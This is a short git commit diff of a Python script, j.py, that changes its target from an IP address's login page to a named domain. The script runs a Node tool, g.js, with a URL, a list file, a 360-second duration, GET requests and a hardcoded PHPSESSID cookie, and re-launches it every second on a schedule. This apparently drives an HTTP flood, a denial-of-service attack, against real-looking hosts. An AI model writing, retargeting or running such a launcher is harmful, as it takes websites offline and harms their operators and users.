a87944fbe5811ccd705a11e295c737014c580448
junelynpalma <74013446+junelynpalma@users.noreply.github.com>
2021-09-24 19:25:25 +0800

    Update j.py

--- j.py
+++ j.py
@@ -3,10 +3,10 @@ import time
 import os
 import sys
 
-os.system('node g.js http://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
+os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
 
 def job():
-    os.system('node g.js http://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
+    os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
     
 schedule.every(1).seconds.do(job)
 
